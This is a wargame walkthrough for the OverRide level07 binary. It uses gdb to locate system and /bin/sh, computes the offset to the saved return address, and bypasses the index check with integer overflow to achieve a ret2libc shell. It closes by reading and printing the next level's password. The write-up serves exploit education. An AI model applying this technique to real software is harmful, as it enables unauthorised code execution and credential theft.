# Level07 walkthrough

If we run our program, we can see that we have only three commands for
store, read data and exit. Let's dive into gdb.
In the first part of the main function program will make kind of bzero for argv and envp.
Good thing—there is not any check for position to store and read data from except
the index can't be divisible by 3.
Our goal is to rewrite the return address of the main function to address of system function and pass address of /bin/sh as argument.
First of all - let's find the address of system function and /bin/sh string.
```gdb
(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system
0xf7f48a50  svcerr_systemerr
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```
We can see that the address of the system function is `0xf7e6aed0` and address of /bin/sh is `0xf7f897ec`.

Let's find the address of buffer in memory. To do that, we can set breakpoint on store function and check the address of buffer.
Inside store function set a breakpoint and check ebp+0x8.
```gdb
Input command: store
 Number: 42
 Index: 1

Breakpoint 1, 0x080486c8 in store_number ()
(gdb) x /x $ebp+0x8
0xffffd400:	0xffffd424
```
Okay, we have address of buffer - `0xffffd424`. Now it's time to find the address of EIP.
Let's set breakpoint before store function and check the address of EIP.
```gdb
(gdb) b *0x080488ea
Breakpoint 1 at 0x80488ea
(gdb) r
...
(gdb) i f
Stack level 0, frame at 0xffffd5f0:
 eip = 0x80488ea in main; saved eip 0xf7e45513
 Arglist at 0xffffd5e8, args:
 Locals at 0xffffd5e8, Previous frame's sp is 0xffffd5f0
 Saved registers:
  ebx at 0xffffd5dc, ebp at 0xffffd5e8, esi at 0xffffd5e0, edi at 0xffffd5e4, eip at 0xffffd5ec
```
eip is 0xffffd5ec. Now we can calculate offset between buffer and EIP.
```python
0xffffd5ec - 0xffffd424
456
456 / 4
114.0
```
Offset is 114. Now we can start to exploit program.
We can't use 114 as index because it's divisible by 3. But we con overflow integer to pass this check.
```
( 4294967296 / 4 ) + 114 ) = 1073741938
```
So now we should store the address of system function (0xf7e6aed0 == 4159090384) to index 114 (1073741938) and
address of /bin/sh (0xf7f897ec == 4160264172) to index 116. After exit from the program, the next eip will be the address of system function.
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
Aaaand we're done.
